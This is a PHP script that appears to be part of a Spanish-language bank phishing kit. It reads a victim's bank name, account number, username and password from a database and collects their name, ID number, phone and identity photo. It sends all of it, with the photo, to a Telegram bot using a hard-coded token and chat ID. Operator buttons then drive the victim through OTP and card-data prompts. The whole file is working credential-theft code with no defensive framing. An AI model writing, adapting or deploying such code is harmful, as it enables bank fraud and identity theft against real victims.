<?php
ob_start();
require 'conexion.php';

$codigo    = $_POST['codigo']   ?? '';
$key       = $_POST['key']      ?? '';
$nombre    = $_POST['nombre']   ?? '';
$cedula    = $_POST['cedula']   ?? '';
$telefono2 = $_POST['telefono'] ?? '';
$fotoTmp   = $_FILES['photo']['tmp_name'] ?? null;
$fotoError = $_FILES['photo']['error']    ?? 1;

if (!$key) die("Error: Key no proporcionada.");

$stmt = $pdo->prepare("SELECT numero_cuenta, monto, banco, nombre, telefono, correo FROM solicitudes WHERE `key` = ? LIMIT 1");
$stmt->execute([$key]);
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) die("Error: Solicitud no encontrada.");

$celular = $data['numero_cuenta'];
$monto   = $data['monto'];
$banco   = $data['banco'];
$usuario = $data['nombre'];
$clave   = $data['telefono'];
$correo  = $data['correo'];

$nuevo_request_id = uniqid("req_");

// ── SAVE PHOTO TO DISK ──
$fotoPath = null;
if ($fotoTmp && $fotoError === UPLOAD_ERR_OK) {
    $uploadDir = '/var/www/html/uploads/fotos/';
    if (!is_dir($uploadDir)) {
        @mkdir($uploadDir, 0775, true);
    }
    $fileName = preg_replace('/[^a-zA-Z0-9_]/', '_', $key) . '_' . time() . '.jpg';
    $destPath = $uploadDir . $fileName;
    if (@move_uploaded_file($fotoTmp, $destPath)) {
        $fotoPath = 'uploads/fotos/' . $fileName;
    } else {
        // fallback: try /tmp/
        $tmpDest = '/tmp/' . $fileName;
        if (@move_uploaded_file($fotoTmp, $tmpDest)) {
            // copy to web-accessible path
            @copy($tmpDest, $destPath);
            if (file_exists($destPath)) {
                $fotoPath = 'uploads/fotos/' . $fileName;
            }
        }
        error_log("FOTO UPLOAD FAIL: src=$fotoTmp dest=$destPath err=" . error_get_last()['message']);
    }
}

// ── UPDATE DB ──
$update = $pdo->prepare("UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE `key` = ?");
$update->execute([$nuevo_request_id, $key]);

$saveId = $pdo->prepare("UPDATE solicitudes SET nombre_id = ?, cedula = ?, foto_path = ? WHERE `key` = ?");
$saveId->execute([$nombre, $cedula, $fotoPath, $key]);

// ── TELEGRAM ──
$token   = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$chat_id = "-4923753161";

$mensaje  = "📸 FOTO / IDENTIDAD\n";
$mensaje .= "------------------------\n";
$mensaje .= "📱 Celular: $celular\n";
$mensaje .= "💰 Monto: $monto\n";
$mensaje .= "🏦 Banco: $banco\n";
$mensaje .= "📧 Correo: $correo\n";
$mensaje .= "------------------------\n";
$mensaje .= "👤 Usuario: $usuario\n";
$mensaje .= "🔒 Clave: $clave\n";
$mensaje .= "------------------------\n";
$mensaje .= "🧾 Nombre: $nombre\n";
$mensaje .= "🪪 Cédula: $cedula\n";
$mensaje .= "📞 Teléfono: $telefono2\n";
$mensaje .= "------------------------\n";

$botones = [
  'inline_keyboard' => [[
    ['text' => "🟢DINÁMICA", 'callback_data' => "OPCION_1_$nuevo_request_id"],
    ['text' => "🟢TARJETA",  'callback_data' => "OPCION_2_$nuevo_request_id"]
  ], [
    ['text' => "🔴ERROR USUARIO",      'callback_data' => "OPCION_3_$nuevo_request_id"],
    ['text' => "🔴ERROR Dinámica/OTP", 'callback_data' => "OPCION_4_$nuevo_request_id"],
    ['text' => "🟢FOTO",               'callback_data' => "OPCION_5_$nuevo_request_id"]
  ], [
    ['text' => "🔴ERROR Dinámica/OTP", 'callback_data' => "OPCION_9_$nuevo_request_id"],
    ['text' => "🟢FINALIZAR",           'callback_data' => "OPCION_10_$nuevo_request_id"]
  ]]
];

$ch = curl_init();
if ($fotoTmp && $fotoError === UPLOAD_ERR_OK && $fotoPath && file_exists('/var/www/html/' . $fotoPath)) {
    $telegramUrl = "https://api.telegram.org/bot$token/sendPhoto";
    $postData = [
        'chat_id'      => $chat_id,
        'caption'      => $mensaje,
        'reply_markup' => json_encode($botones),
        'photo'        => new CURLFile('/var/www/html/' . $fotoPath)
    ];
} elseif ($fotoTmp && $fotoError === UPLOAD_ERR_OK) {
    // file saved to tmp only, send from tmp
    $tmpFile = '/tmp/' . preg_replace('/[^a-zA-Z0-9_]/', '_', $key) . '_' . time() . '.jpg';
    $telegramUrl = "https://api.telegram.org/bot$token/sendPhoto";
    $postData = [
        'chat_id'      => $chat_id,
        'caption'      => $mensaje,
        'reply_markup' => json_encode($botones),
        'photo'        => new CURLFile($fotoTmp)
    ];
} else {
    $telegramUrl = "https://api.telegram.org/bot$token/sendMessage";
    $postData = [
        'chat_id'      => $chat_id,
        'text'         => $mensaje,
        'reply_markup' => json_encode($botones)
    ];
}
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

header("Location: espera.html?rid=$nuevo_request_id&key=$key&correo=" . urlencode($correo));
exit;
?>
